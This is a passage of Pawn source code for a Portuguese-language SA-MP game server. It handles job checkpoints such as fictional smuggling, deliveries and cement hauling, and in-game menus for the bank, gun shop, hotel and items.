    	SetTimerEx("BusStop", 12000, false, "d", playerid);
    	return;
	}
	
	if(AirTransport[playerid] > 0)
	{
		new part, type;
		
		type = AirTransport[playerid] & 0x1;
		part = AirTransport[playerid] >> 1;
		
		if(part >= sizeof Airports)
		{
		    part = 0;
		    
		    if(type == 1)
		    {
				new string[128];
				new pay;
				
				pay = random(151) + 50;
				pay -= pay % 10;
				
				Pay(playerid, pay);
				format(string, sizeof string, "Mercadorias entregues, você recebeu $%d,00 dólares.", pay);
		        SendClientMessage(playerid, COLOUR_PILOT, string);
		    }
		}
		
		else if(type == 1)
		    SendClientMessage(playerid, COLOUR_PILOT, "Mercadorias entregues, vá para o próximo ponto.");

		if(type == 0)
		    SendClientMessage(playerid, COLOUR_PILOT, "Destino alcançado, espere por passageiros e decole.");
		
		AirTransport[playerid] = ((part + 1) << 1) | type;
		SetPlayerRaceCheckpoint(playerid, 0, Airports[part][0], Airports[part][1], Airports[part][2], 0.0, 0.0, 0.0, 8.0);
	}
	
	if(Smuggling[playerid] > 0)
	{
	    new Float:X, Float:Y, Float:Z;
	    
	    PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);
	    
	    switch(Smuggling[playerid])
	    {
	        case 1:
	        {
	            
				if(SmugglingPart[playerid] == 0)
				{
				    X = -2329.10, Y = 1530.41, Z = 17.33;
				    SendClientMessage(playerid, COLOUR_SMUGGLER, "Entre no navio e pegue seu produto falsificado.");
				}
				
				else if(SmugglingPart[playerid] == 1)
				{
				    X = -2436.35, Y = 1528.98, Z = 17.34;
				    SendClientMessage(playerid, COLOUR_SMUGGLER, "Pule daqui e vá até outro ponto indicado, cuidado pra não molhar a mercadoria.");
				}
				
				else if(SmugglingPart[playerid] == 2)
				{
				    X = -2650.08, Y = 1361.02, Z = 7.31;
                    SetPlayerPos(playerid, -2436.29, 1524.75, 18.19);
                    SendClientMessage(playerid, COLOUR_SMUGGLER, "Corra para a rampa.");
				}
				
				else if(SmugglingPart[playerid] == 3)
				{
                    X = -2659.74, Y = 1530.51, Z = 54.97;
                    SendClientMessage(playerid, COLOUR_SMUGGLER, "Jogue o produto no mar, um pescador irá pegar depois. Cuidado para não cair.");
				}
				
				else
				{
				    new string[128];
				    new pay;
				    
				    Smuggling[playerid] = 0;
				    SmugglingPart[playerid] = 0;
				    pay = 150 + random(251);
				    pay -= pay % 10;
				    Pay(playerid, pay);
				    SetPlayerPos(playerid, -2659.69, 1534.64, 54.42);
				    format(string,sizeof(string),"Você caiu no mar e se molhou, mas conseguiu salvar o produto, o chefe te deu $%d,00 dólares.", pay);
					SendClientMessage(playerid, COLOUR_SMUGGLER, string);
					return;
				}
	        }
	        
	        case 2:
	        {
				if(SmugglingPart[playerid] == 0)
				{
				    X = 2215.5102, Y = -983.4656, Z = 62.1585;
	            	SendClientMessage(playerid, COLOUR_SMUGGLER, "Aí rapaz! Nossos papos sempre são assim, escondidos. Os carros tão ai, só entrar e escolher um!");
	 	   			SendClientMessage(playerid, COLOUR_SMUGGLER, "Leve ele para os Triads checarem e ver se estão afim.");
				}
				
				else if(SmugglingPart[playerid] == 1)
				{
				    new vehid;
					new Float:H;
					
					vehid = GetPlayerVehicleID(playerid);
					
					if(!IsJobVehicle(vehid, SMUGGLING))
					{
                        Smuggling[playerid] = 0;
					    SmugglingPart[playerid] = 0;
					    SendClientMessage(playerid, COLOUR_SMUGGLER, "Este não é um veículo de contrabando, seu infeliz...");
					    return;
					}
					
					GetVehicleHealth(vehid, H);
					
					if(H < 850.0)
					{
					    Smuggling[playerid] = 0;
					    SmugglingPart[playerid] = 0;
					    SendClientMessage(playerid, COLOUR_SMUGGLER, "É brincadeira, certo? Acha que vou querer um carro nesse estado? Vaza...");
						return;
					}
					
					SmugglingPart[playerid]++;
				    TogglePlayerControllable(playerid, false);
				    SendClientMessage(playerid, COLOUR_SMUGGLER, "Hun...");
				    SetTimerEx("CheckingSmugglingCar", 5000, false, "d", playerid);
				    return;
				}
				
				else if(SmugglingPart[playerid] == 2)
				{
					new string[128];
				    new vehid, pay;
					new Float:H;

					vehid = GetPlayerVehicleID(playerid);
					
                    if(!IsJobVehicle(vehid, SMUGGLING))
					{
                        Smuggling[playerid] = 0;
					    SmugglingPart[playerid] = 0;
					    SendClientMessage(playerid, COLOUR_SMUGGLER, "Este não é um veículo de contrabando, seu infeliz...");
					    return;
					}
					
					GetVehicleHealth(vehid, H);
					
					if(H < 850.0)
					{
					    Smuggling[playerid] = 0;
					    SmugglingPart[playerid] = 0;
					    SendClientMessage(playerid, COLOUR_SMUGGLER, "É brincadeira, certo? Acha que vou querer um carro nesse estado? Vaza...");
						return;
					}

				    Smuggling[playerid] = 0;
				    SmugglingPart[playerid] = 0;
				    pay = 200 + random(401);
				    pay -= pay % 10;
				    Pay(playerid, pay);
				    SetPlayerPos(playerid, 2730.0046, -2452.3933, 17.5937);
				    SetVehicleToRespawn(vehid);
				    format(string,sizeof(string),"Carro exportado, você recebeu $%d,00 dólares.", pay);
					SendClientMessage(playerid, COLOUR_SMUGGLER, string);
					return;
				}
			}
	        
	        case 3:
	        {
	            if(SmugglingPart[playerid] == 0)
	            {
	                X = -2124.9001, Y = -270.4929, Z = 35.3203;
	                SendClientMessage(playerid, COLOUR_SMUGGLER, "Vá buscar as armas escondidas, enquanto isto ficarei aqui em busca da freguesia.");
	            }
	            
	            else if(SmugglingPart[playerid] == 1)
	            {
	                new rand;
	                
	                rand = random(sizeof SmugglingWeaponPlaces);
	                X = SmugglingWeaponPlaces[rand][0], Y = SmugglingWeaponPlaces[rand][1], Z = SmugglingWeaponPlaces[rand][2];
					SetPlayerCellPhoneAction(playerid);
	                SendClientMessage(playerid, COLOUR_SMUGGLER, "Mano, achei um comprador, entrega lá a mercadoria que a gente divide a grana.");
                    SendClientMessage(playerid, COLOUR_SMUGGLER, "Vai vai, antes que o cara mude de idéia...");
                    SetTimerEx("PhoneCallError", 7000, false, "dd", playerid, 0);
				}
	            
	            else if(SmugglingPart[playerid] == 2)
	            {
					new rand, ret;
					
					rand = random(3);
					Smuggling[playerid] = 0;
				    SmugglingPart[playerid] = 0;
				    
					if(rand < 2)
					{
					    new string[128];
						new pay;
						
						pay = 200 + random(301);
				    	pay -= pay % 10;
				    	Pay(playerid, pay);
				    	format(string,sizeof(string),"Hun... Negócio é negócio, aqui está: $%d,00 dólares.", pay);
						SendClientMessage(playerid, COLOUR_SMUGGLER, string);
						return;
					}
					
					rand = random(7);
				    SendClientMessage(playerid, COLOUR_SMUGGLER, "Hun... Mudei de idéia nesses últimos 5 minutos, fique com as armas, eu fico com a grana.");
	    			SendClientMessage(playerid, COLOUR_SMUGGLER, "Até mais, e me agradeça por não chamar os cops.");
	    			
	    			if(rand < 3)
					{
						if(rand == 0)
						    ret = GivePlayerSysWeapon(playerid, 30, 120);

						else if(rand == 1)
						    ret = GivePlayerSysWeapon(playerid, 31, 120);

						else
						    ret = GivePlayerSysWeapon(playerid, 35, 3);

						if(ret == 0)
						    SendClientMessage(playerid, COLOUR_SMUGGLER, "Você recebeu uma arma, pois o cliente recusou a oferta.");
					}
					
					return;
	            }
	        }
	        
	        default:
	        {
	            if(SmugglingPart[playerid] == 0)
	            {
	                X = 1615.7572, Y = -1896.8995, Z = 13.5490;
	                SendClientMessage(playerid, COLOUR_SMUGGLER, "Hun... Não tenho drogas comigo, mas conheço alguém que tenha, aqui tá o endereço.");
	                SendClientMessage(playerid, COLOUR_SMUGGLER, "Esse cara é parceiro, vai te arranjar um servicinho...");
	            }
	            
	            else if(SmugglingPart[playerid] == 1)
	            {
	                new rand;

	                rand = random(sizeof SmugglingDrugPlaces);
	                X = SmugglingDrugPlaces[rand][0], Y = SmugglingDrugPlaces[rand][1], Z = SmugglingDrugPlaces[rand][2];
	                SendClientMessage(playerid, COLOUR_SMUGGLER, "Tá afim de descolar uma grana? Tenho a coisa \"certa\" pra você, vá entregar essa \"mercadoria\"...");
	                SendClientMessage(playerid, COLOUR_SMUGGLER, "O comprador é de Las Venturas, boa viagem, e vê se não dá mancada...");
	            }
	            
	            else if(SmugglingPart[playerid] == 2)
	            {
	                new rand;
	                
	                rand = random(3);
					Smuggling[playerid] = 0;
				    SmugglingPart[playerid] = 0;
	                
                    if(rand < 2)
					{
					    new string[128];
						new pay;

						pay = 200 + random(401);
				    	pay -= pay % 10;
				    	Pay(playerid, pay);
				    	format(string,sizeof(string),"Opa, minha \"mercadoria\" chegou, tá aqui a grana: $%d,00 dólares.", pay);
						SendClientMessage(playerid, COLOUR_SMUGGLER, string);
						return;
					}

				    SendClientMessage(playerid, COLOUR_SMUGGLER, "Drogas?? TÁ MALUCO??? Não sei do que você está falando, cai fora antes que eu chame a policia!");
	    			SendClientMessage(playerid, COLOUR_SMUGGLER, "O comprador recusou a oferta...");
	    			return;
	            }
	        }
	    }
		
		SmugglingPart[playerid]++;
		SetPlayerRaceCheckpoint(playerid, 1, X, Y, Z, 0.0, 0.0, 0.0, 4.0);
	    return;
	}
	
	if(Submission[SUBMISSION_ICE_CREAM] == playerid)
	{
		new string[128];
	    new place;
	    
	    if(!IsPlayerInVehicle(playerid, ICE_CREAM))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não está no carro de sorvete!");
	        return;
	    }
	    
	    if(IceCream <= 0)
	    {
	        IceCream = random(3) + 2;
	        place = random(sizeof IceCreamPlaces);
	        SetPlayerRaceCheckpoint(playerid, 1, IceCreamPlaces[place][0], IceCreamPlaces[place][1], IceCreamPlaces[place][2], 0.0, 0.0, 0.0, 4.0);
	        format(string, sizeof string, "[SORVETERIA] Você tem %d sorvetes para entregar.", IceCream);
	        SendClientMessage(playerid, COLOUR_ICE_CREAM, string);
	        return;
	    }
	    
	    IceCream--;
	    SendClientMessage(playerid, COLOUR_ICE_CREAM, "Entrega concluída!");
	    
	    if(IceCream <= 0)
	    {
	        new pay;

			pay = (random(101) + 50);
			pay -= (pay % 5);

			GivePlayerSysMoney(playerid, pay);
	        SetPlayerRaceCheckpoint(playerid, 1, 1568.2290, -1880.4467, 13.5469, 0.0, 0.0, 0.0, 4.0);
	        format(string, sizeof string, "Sorvetes entregues, você recebeu $%d,00 dólares.", pay);
	        SendClientMessage(playerid, COLOUR_ICE_CREAM, string);
	        SendClientMessage(playerid, COLOUR_ICE_CREAM, "Volte para a sorveteria para pegar mais pedidos.");
	        return;
	    }
	    
     	place = random(sizeof IceCreamPlaces);
      	SetPlayerRaceCheckpoint(playerid, 1, IceCreamPlaces[place][0], IceCreamPlaces[place][1], IceCreamPlaces[place][2], 0.0, 0.0, 0.0, 4.0);
       	SendClientMessage(playerid, COLOUR_ICE_CREAM, "Entregue o próximo pedido.");
	    return;
	}
	
	if(Submission[SUBMISSION_DRUGS] == playerid)
	{
	    new string[128];
	    new place;
	    
	    if(Drugs <= 0)
	    {
	        Drugs = random(4) + 2;
	        place = random(sizeof DrugPlaces);
	        SetPlayerRaceCheckpoint(playerid, 1, DrugPlaces[place][0], DrugPlaces[place][1], DrugPlaces[place][2], 0.0, 0.0, 0.0, 4.0);
	        format(string, sizeof string, "Oloco mano, tu é responsa, toma mais umas mercadoria aqui.", Drugs);
			SendClientMessage(playerid, COLOUR_DRUGS, string);
	        return;
	    }
	    
	    Drugs--;
	    SendClientMessage(playerid, COLOUR_DRUGS, "Entrega concluída!");

	    if(Drugs <= 0)
	    {
	        new pay;

			pay = (random(151) + 50);
			pay -= (pay % 5);

			GivePlayerSysMoney(playerid, pay);
	        SetPlayerRaceCheckpoint(playerid, 1, 2270.4401, -1033.6555, 51.8252, 0.0, 0.0, 0.0, 4.0);
	        format(string, sizeof string, "Drogas entregues, você recebeu $%d,00 dólares.", pay);
	        SendClientMessage(playerid, COLOUR_DRUGS, string);
	        SendClientMessage(playerid, COLOUR_DRUGS, "Volte para o laboratório de drogas para pegar mais.");
	        return;
	    }

     	place = random(sizeof DrugPlaces);
      	SetPlayerRaceCheckpoint(playerid, 1, DrugPlaces[place][0], DrugPlaces[place][1], DrugPlaces[place][2], 0.0, 0.0, 0.0, 4.0);
       	SendClientMessage(playerid, COLOUR_DRUGS, "Entregue o próximo pedido.");
	    return;
	}
	
	if(Submission[SUBMISSION_IML] == playerid)
	{
	    if(!IsPlayerInVehicle(playerid, IML))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não está no carro funerário!");
	        return;
	    }
	    
	    if(Bodies & 0x1)
	        SendClientMessage(playerid, COLOUR_IML, "Enterrando os corpos...");
	        
	    else
	        SendClientMessage(playerid, COLOUR_IML, "Aguarde os corpos serem colocados...");
	        
	    TogglePlayerControllable(playerid, false);
	    SetTimer("PlacingBodies", 10000, false);
		return;
	}
	
	if(Submission[SUBMISSION_CEMENT] == playerid)
	{
	    if(!IsPlayerInVehicle(playerid, CEMENT))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não está no caminhão de cimento!");
	        return;
	    }
	    
	    Cement = !Cement;
	    
	    if(!Cement)
	    {
	        new string[128];
	        new place, pay;

            place = random(sizeof CementPlaces);
			pay = (random(101) + 50);
			pay -= (pay % 5);
			
			GivePlayerSysMoney(playerid, pay);
	    	SetPlayerRaceCheckpoint(playerid, 1, CementPlaces[place][0], CementPlaces[place][1], CementPlaces[place][2], 0.0, 0.0, 0.0, 4.0);
			format(string, sizeof string, "[CIMENTARIA] Muito bem, você recebeu $%d,00 dólares.", pay);
			SendClientMessage(playerid, COLOUR_CEMENT, string);
			SendClientMessage(playerid, COLOUR_CEMENT, "[CIMENTARIA] Transporte o caminhão para o descarregamento.");
	        return;
	    }
	    
	    TogglePlayerControllable(playerid, false);
	    SendClientMessage(playerid, COLOUR_CEMENT, "Descarregando cimento...");
	    SetTimer("UnloadingCement", 10000, false);
		return;
	}
	
	if(Submission[SUBMISSION_POST] == playerid)
	{
	    if(!IsPlayerInVehicle(playerid, POST))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não está no carro de eletricidade!");
	        return;
	    }
	    
	    if(Posts <= 0)
	    {
	        new string[128];
	    	new place;
	    
	        Posts = random(4) + 2;
	        place = random(sizeof PostPlaces);
	        SetPlayerRaceCheckpoint(playerid, 1, PostPlaces[place][0], PostPlaces[place][1], PostPlaces[place][2], 0.0, 0.0, 0.0, 4.0);
	        format(string, sizeof string, "[COMPANHIA ELÉTRICA] É necessário realizar a manutenção em %d postes.", Posts);
			SendClientMessage(playerid, COLOUR_POST, string);
	        return;
	    }

		TogglePlayerControllable(playerid, false);
		SendClientMessage(playerid, COLOUR_POST, "Realizando manutenção...");
		SetTimer("FixingPost", 10000, false);
		return;
	}
}

public OnPlayerSelectedMenuRow(playerid, row)
{
	new Menu:mid;

	mid = GetPlayerMenu(playerid);

	if(!IsValidMenu(mid))
	    return 0;
	
	if(mid == mTuning)
	{
	    if(TuneData[3] == -1)
	    {
	    	TuneData[3] = Tunes[row];
			UpdateTuningMenu();
			return 1;
		}
		
		if(TuneData[4] == -1)
		{
		    TuneData[4] = Tunes[row];
	    	UpdateTuningMenu();
	    	return 1;
		}
		
		if(row == 0)
		{
		    new value;
		    
		    if(TuneData[3] == PAINTJOBS)
			    value = 1000;

			else
			    value = GetComponentValue(TuneData[4]);
			    
			if(GetVehicleComponent(TuneData[1], TuneData[3]) == TuneData[4])
			    DrawTextForPlayer(playerid, "Este veículo já possui este componente.", COLOUR_RED, TEXTDRAW_STYLE_3, 3000);
		
			else if(GetPlayerSysMoney(playerid) < value)
			    DrawTextForPlayer(playerid, "Dinheiro insuficiente.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
			
			else
			{
			    GivePlayerSysMoney(playerid, -value);
			    SaveVehicleComponent(TuneData[1], TuneData[4], TuneData[3]);
      			DrawTextForPlayer(playerid, "Componente aplicado.", COLOUR_GREEN, TEXTDRAW_STYLE_2, 1000);
			}
		}
		
		else
		{
            new comp;

			comp = GetVehicleComponent(TuneData[1], TuneData[3]);

			if(TuneData[3] == PAINTJOBS)
			{
			    RemoveVehiclePaintjob(TuneData[1]);

			    if(comp != 0xFF)
					ChangeVehiclePaintjob(TuneData[1], comp);
			}

			else
			{
			    RemoveVehicleComponent(TuneData[1], TuneData[4]);

			    if(comp != 0xFF)
					AddVehicleComponent(TuneData[1], comp);
			}

	        TuneData[4] = -1;
		}
		
		UpdateTuningMenu();
		return 1;
	}
	
	if(mid == Bank[0])
	{
	    new string[128];
	    
	    switch(row)
	    {
	    	case 0:
	    	{
	    	    BankOpc[playerid] = 1;
				format(string, sizeof string, "$%s,00", hGetString(GetPlayerXFilePath(playerid), "Bank"));
				SetMenuColumnHeader(Bank[1], 1, string);
				ShowMenuForPlayer(Bank[1], playerid);
				TogglePlayerControllable(playerid, false);
	    	}
	    	
	    	case 1:
	    	{
	    	    BankOpc[playerid] = 2;
	    	    format(string, sizeof string, "$%s,00", hGetString(GetPlayerXFilePath(playerid), "Bank"));
				SetMenuColumnHeader(Bank[1], 1, string);
	    	    ShowMenuForPlayer(Bank[1], playerid);
    		    TogglePlayerControllable(playerid, false);
	    	}
		}
	}
	
	else if(mid == Bank[1])
	{
		new string[128];
 		new BankAmount[] = {
		 	1, 5, 10, 50, 100, 500, 1000,
		 	5000, 10000, 50000, 100000
 		};
 		
  		if(BankOpc[playerid] == 1)
    	{
   			if(hGetInt(GetPlayerXFilePath(playerid), "Bank") < BankAmount[row])
   			    DrawTextForPlayer(playerid, "Você não possui essa quantidade para sacar.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
    		
	        else
	        {
	        	GivePlayerSysMoney(playerid, BankAmount[row]);
				hSetInt(GetPlayerXFilePath(playerid), "Bank", hGetInt(GetPlayerXFilePath(playerid), "Bank") - BankAmount[row]);
    		}
		}
		
		else if(BankOpc[playerid] == 2)
		{
  			if(GetPlayerSysMoney(playerid) < BankAmount[row])
       			DrawTextForPlayer(playerid, "Você não possui essa quantidade para depositar.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
          	
           	else
	        {
         		GivePlayerSysMoney(playerid, -BankAmount[row]);
				hSetInt(GetPlayerXFilePath(playerid), "Bank", hGetInt(GetPlayerXFilePath(playerid), "Bank") + BankAmount[row]);
    		}
		}
		
		else
		{
		    TogglePlayerControllable(playerid, true);
		    return 0;
		}
		
		format(string, sizeof string, "$%s,00", hGetString(GetPlayerXFilePath(playerid), "Bank"));
		SetMenuColumnHeader(Bank[1], 1, string);
		ShowMenuForPlayer(Bank[1], playerid);
		TogglePlayerControllable(playerid, false);
		ApplyAnimation(playerid, "PED", "ATM", 4.1, 0, 1, 1, 1, 1, 1);
	}
	
	if(mid == Guns[0])
	{
	    ShowMenuForPlayer(Guns[row+1], playerid);
	    TogglePlayerControllable(playerid, false);
	    return 1;
	}
	
	for(new g = 1; g < 7; g++)
	{
	    if(mid == Guns[g])
	    {
	        new count;
	        
	        count = 0;
			
	        for(new gun = 0; gun < sizeof Weapons; gun++)
	        {
	            if(!IsForbiddenWeapon(gun) && Weapons[gun][wSlot] == g+1)
	            {
	                if(row == count)
	                {
						if(GetPlayerSysMoney(playerid) < Weapons[gun][wValue])
						{
						    DrawTextForPlayer(playerid, "Dinheiro insuficiente.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
						    break;
						}
						
						new res;
						
						res = GivePlayerSysWeapon(playerid, gun, Weapons[gun][wAmmo]);
						
						if(res == 0)
						{
						    GivePlayerSysMoney(playerid, -Weapons[gun][wValue]);
						    DrawTextForPlayer(playerid, "Arma adquirida.", COLOUR_GREEN, TEXTDRAW_STYLE_2, 1500);
						}
						
						if(res == 1)
						    DrawTextForPlayer(playerid, "Essa arma já possui o número máximo de cartuchos.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
						
						if(res == 2)
						    DrawTextForPlayer(playerid, "Voce não pode carregar mais de uma arma pesada.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
						
						if(res == 3)
						    DrawTextForPlayer(playerid, "Voce não pode carregar mais de uma arma leve.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
						
	                    break;
	                }
	                
					count++;
	            }
	        }
	        
	        ShowMenuForPlayer(Guns[g], playerid);
			TogglePlayerControllable(playerid, false);
			return 1;
	    }
	}
	
	if(mid == Guns[7])
	{
	    if(GetPlayerSysMoney(playerid) < Explosives[row][expValue])
		    DrawTextForPlayer(playerid, "Dinheiro insuficiente.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
		
		else
		{
		    new res;
		    
		    res = GivePlayerExplosive(playerid, row);
		    
		    if(res == 0)
		    {
		    	GivePlayerSysMoney(playerid, -Explosives[row][expValue]);
                DrawTextForPlayer(playerid, "Explosivo adquirido.", COLOUR_GREEN, TEXTDRAW_STYLE_2, 1500);
			}
			
			if(res == 1)
			    DrawTextForPlayer(playerid, "Voce já possui a quantidade máxima deste explosivo.", COLOUR_RED, TEXTDRAW_STYLE_3, 3000);
		}

	    ShowMenuForPlayer(Guns[7], playerid);
		TogglePlayerControllable(playerid, false);
		return 1;
	}
	
	if(mid == Guns[8])
	{
	    if(GetPlayerSysMoney(playerid) < 300)
		{
		    DrawTextForPlayer(playerid, "Dinheiro insuficiente.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
		}
		
		else
		{
		    GivePlayerSysMoney(playerid, -300);
			SetPlayerArmour(playerid, 100.0);
			DrawTextForPlayer(playerid, "Colete adquirido.", COLOUR_GREEN, TEXTDRAW_STYLE_2, 1500);
		}
	    
	    ShowMenuForPlayer(Guns[8], playerid);
		TogglePlayerControllable(playerid, false);
		return 1;
	}
	
	if(mid == Dildos)
	{
		new gun;
		
		gun = row + 10;
		
		if(GetPlayerSysMoney(playerid) < Weapons[gun][wValue])
		{
  			DrawTextForPlayer(playerid, "Dinheiro insuficiente.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
		}

		else if(GivePlayerSysWeapon(playerid, gun, 1) == 4)
		{
		    DrawTextForPlayer(playerid, "Você já possui uma arma branca.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
		}

	    else
		{
  			GivePlayerSysMoney(playerid, -Weapons[gun][wValue]);
	    	DrawTextForPlayer(playerid, "Arma adquirida.", COLOUR_GREEN, TEXTDRAW_STYLE_2, 1500);
		}
		
		TogglePlayerControllable(playerid, true);
		return 1;
	}
	
	if(mid == Hotel)
	{
	    new xpath[128];

		xpath = GetPlayerXFilePath(playerid);
		
	    switch(row)
	    {
	    	case 0:
	    	{
	            if(GetPlayerSysMoney(playerid) < 30)
	            {
	                DrawTextForPlayer(playerid, "Dinheiro insuficiente.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
	            }
	            
	            else if(hGetInt(xpath, "Hotel") == 1)
	            {
	                DrawTextForPlayer(playerid, "Você já está hospedado.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
	            }
	            
	            else
	            {
	                hSetInt(xpath, "Hotel", 1);
	                hSetString(xpath, "Position", "487.7076,-1645.4410,23.7031,177.8549");
	                SetPlayerCounter(playerid, COUNTER_HOTEL, 0);
	                GivePlayerSysMoney(playerid, -30);
	                DrawTextForPlayer(playerid, "Hospedado.", COLOUR_GREEN, TEXTDRAW_STYLE_2, 1500);
	            }
	    	}
	    
	    	case 1:
	    	{
	            if(hGetInt(xpath, "Hotel") == 0)
	            {
	                DrawTextForPlayer(playerid, "Você não está hospedado.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
	            }

	            else
	            {
		        	hSetString(xpath, "Position", "487.7076,-1645.4410,23.7031,177.8549");
		        	DrawTextForPlayer(playerid, "Você irá nascer aqui agora.", COLOUR_GREEN, TEXTDRAW_STYLE_2, 1500);
				}
	    	}
	    
			case 2:
			{
                if(hGetInt(xpath, "Hotel") == 0)
	            {
	                DrawTextForPlayer(playerid, "Você não está hospedado.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
	            }
	            
	            else
	            {
	                hSetInt(xpath, "Hotel", 0);
		        	hSetString(xpath, "Position", "1686.0055,-2239.6494,13.5469,176.8181");
		        	SetPlayerCounter(playerid, COUNTER_HOTEL, 0);
		        	DrawTextForPlayer(playerid, "Você saiu do hotel.", COLOUR_GREEN, TEXTDRAW_STYLE_2, 1500);
				}
			}
		}
		
		TogglePlayerControllable(playerid, true);
		return 1;
	}
	
	if(mid == Toys)
	{
	    new xpath[128];
	    new id, toys;

		xpath = GetPlayerXFilePath(playerid);
		toys = hGetInt(xpath, "Toys");
		
		if(row == sizeof RCs)
		{
		    if(GetPlayerSysMoney(playerid) < 200)
  			{
  		    	DrawTextForPlayer(playerid, "Dinheiro insuficiente.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
			}
		
		    else if(toys == 0)
		    {
		        DrawTextForPlayer(playerid, "Você não possui nenhum brinquedo.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
		    }
		    
			else if(hGetInt(xpath, "Battery") >= 90)
			{
			    DrawTextForPlayer(playerid, "A bateria já está carregada.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
			}
			
			else
			{
			    hSetInt(xpath, "Battery", 100);
			    GivePlayerSysMoney(playerid, -200);
			    DrawTextForPlayer(playerid, "Bateria carregada.", COLOUR_GREEN, TEXTDRAW_STYLE_2, 1500);
			}
		}
		
		else
		{
			id = RCs[row] - 400;
  		
  			if(GetPlayerSysMoney(playerid) < Vehicles[id][vehValue])
  			{
  			    DrawTextForPlayer(playerid, "Dinheiro insuficiente.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
			}
		
			else if(toys & (1 << row))
			{
			    DrawTextForPlayer(playerid, "Você já possui este brinquedo.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
			}
		
			else
			{
			    toys |= 1 << row;
			    hSetInt(xpath, "Toys", toys);
			    GivePlayerSysMoney(playerid, -Vehicles[id][vehValue]);
			    DrawTextForPlayer(playerid, "Brinquedo adquirido.", COLOUR_GREEN, TEXTDRAW_STYLE_2, 1500);
			}
		}
		
	    ShowMenuForPlayer(Toys, playerid);
		TogglePlayerControllable(playerid, false);
	    return 1;
	}
	
	if(mid == Itens)
	{
	    if(GetPlayerSysMoney(playerid) < ItemList[row][itValue])
	    	DrawTextForPlayer(playerid, "Dinheiro insuficiente.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
		
		else
		{
		    switch(row)
			{
			    case 0: //Walk-Talkie
			    {
			        new xpath[128];
					new itens;
					
					xpath = GetPlayerXFilePath(playerid);
					itens = hGetInt(xpath, "Itens");
					
					if(itens & ITEM_WALKTALKIE)
					{
					    DrawTextForPlayer(playerid, "Você já possui um Walk-Talkie.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
				        goto _menuitem;
					}
					
					itens |= ITEM_WALKTALKIE;
					hSetInt(xpath, "Itens", itens);
					DrawTextForPlayer(playerid, "Walk-Talkie adquirido ~n~use /walktalkie", COLOUR_GREEN, TEXTDRAW_STYLE_2, 4000);
			    }
			    
				case 1: //Celular
				{
				    if(GetPlayerPhone(playerid) != 0)
				    {
				        DrawTextForPlayer(playerid, "Você já possui um celular.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
				        goto _menuitem;
				    }
				    
				    new string[128];
					new phone;
					
					phone = CreatePhone(PlayerName(playerid));
					format(string, sizeof string, "Celular adquirido ~n~Numero: %d", phone);
				    DrawTextForPlayer(playerid, string, COLOUR_GREEN, TEXTDRAW_STYLE_2, 4000);
				}
				
				case 2, 3, 4, 5: //Recargas
				{
					new xpath[128], string[128];
				    new credits;
				    new amounts[] = {10, 25, 50, 100};
				    
				    xpath = GetPlayerXFilePath(playerid);
				    credits = hGetInt(xpath, "Credits") + amounts[row - 2];
				    
				    if(credits > 100)
				    {
				        DrawTextForPlayer(playerid, "Você não pode ultrapassar o limite de $100,00 dólares.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
				        goto _menuitem;
				    }
				    
				    hSetInt(xpath, "Credits", credits);
				    format(string, sizeof string, "Créditos adquiridos ~n~Total: $%d,00 dólares", credits);
				    DrawTextForPlayer(playerid, string, COLOUR_GREEN, TEXTDRAW_STYLE_2, 4000);
				}
				
				case 6: //Faca
				{
				    if(GivePlayerSysWeapon(playerid, 4, 1) == 4)
				    {
				        DrawTextForPlayer(playerid, "Você já possui uma arma branca.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
				        goto _menuitem;
				    }
				    
				    DrawTextForPlayer(playerid, "Faca adquirida", COLOUR_GREEN, TEXTDRAW_STYLE_2, 2000);
				}
				
				case 7: //Bastao de Baseball
				{
				    if(GivePlayerSysWeapon(playerid, 5, 1) == 4)
				    {
				        DrawTextForPlayer(playerid, "Você já possui uma arma branca.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
				        goto _menuitem;
				    }

				    DrawTextForPlayer(playerid, "Bastão de Baseball adquirido", COLOUR_GREEN, TEXTDRAW_STYLE_2, 2000);
				}
				
				case 8: //Taco de Golfe
				{
				    if(GivePlayerSysWeapon(playerid, 2, 1) == 4)
				    {
				        DrawTextForPlayer(playerid, "Você já possui uma arma branca.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
				        goto _menuitem;
				    }

				    DrawTextForPlayer(playerid, "Taco de Golfe adquirido", COLOUR_GREEN, TEXTDRAW_STYLE_2, 2000);
				}
				
				case 9: //Flores
				{
				    if(GivePlayerSysWeapon(playerid, 14, 1) == 4)
				    {
				        DrawTextForPlayer(playerid, "Você já possui uma arma branca.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
				        goto _menuitem;
				    }

				    DrawTextForPlayer(playerid, "Buque de Flores adquirido", COLOUR_GREEN, TEXTDRAW_STYLE_2, 2000);
				}
				
				case 10: //Bengala
				{
				    if(GivePlayerSysWeapon(playerid, 15, 1) == 4)
				    {
